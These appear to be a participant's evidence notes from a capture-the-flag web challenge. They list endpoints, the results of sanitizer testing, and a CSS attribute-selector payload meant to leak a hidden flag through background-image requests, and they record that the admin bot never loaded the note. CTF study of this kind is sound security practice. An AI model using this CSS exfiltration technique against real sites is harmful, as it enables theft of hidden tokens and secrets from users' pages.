# Approve Please, Genie! — evidence notes

Target: `144.79.188.39:35757` (expired).

## Stack / fingerprint
- `X-Powered-By: Express`; JSON body error showed `/app/node_modules/body-parser` → Express + body-parser.
- Note page CSP:
  `default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src * data:; object-src 'none'; base-uri 'none'; frame-ancestors 'none'`

## Endpoints
- `POST /note` body `content=<html>` →
  `{"id":"<uuid>","leakToken":"<t>","viewUrl":"/note/<id>","collectUrl":"/collect?t=<t>","leaksUrl":"/leaks/<t>"}`
- `GET /note/<id>` →
  `<input type="hidden" id="flag-holder" value="REDACTED_ONLY_ADMIN_CAN_SEE_THIS"><h1>Lá sớ của dân</h1><div id="note-content"><div>…sanitized…</div></div>`
- `POST /report` body `id=<uuid>` → normally `{"ok":...}`; observed `{"error":"admin bot failed to load the note"}` and `{"error":"slow down"}` (rate limit). `url=<x>` → `{"error":"note not found"}` (id is the right field).
- `GET /collect?t=<token>&q=<data>` → logs the query, returns 1x1 GIF.
- `GET /leaks/<token>` → `[{"query":{"t":...,"q":"<data>"},"ip":"...","ts":...}]`.

## Sanitizer behavior (input → rendered note-content)
- `<script>…</script>` → removed
- `<svg onload>` → removed
- `<iframe src="javascript:…">` → removed
- `<meta http-equiv=refresh>` / `<base>` / `<form>` / `<link>` → removed
- `onerror`/`onload`/`ontoggle`/`onfocus` → attribute stripped
- `href="javascript:…"` → href stripped
- `<img src="…">` → kept (`&` → `&amp;`)
- `<a href="http://…">` → kept
- `<style>…</style>` → kept
- `style="…"` attribute → kept

→ inline JS blocked (CSP `script-src 'self'`), inline CSS fully allowed → CSS blind exfil.

## Exfil vector
`#flag-holder[value^="<prefix>"] ~ #note-content { background: url(/collect?t=TOK&q=<char>) }`
- `#flag-holder` (hidden input) is a preceding sibling of `#note-content` (both children of `<body>`).
- Attribute selector matches regardless of input visibility; the visible `#note-content` fetches `/collect`.

## Bot failure (why no flag)
Every `/report` returned `{"error":"admin bot failed to load the note"}` for every note content
tried (plain text, SVG, `<div>`, `<img>`, `<style>`+dimensions), across multiple cooldowns, Host
headers, and browser-like headers. The bot never loaded a note on this instance, then the instance
expired (`curl` → connection refused).

## Flag format (from other PTIT challenges)
`PTITCTF{...}` e.g. `PTITCTF{vm_1s_ju5t_4_sh4d0w_r3!}`
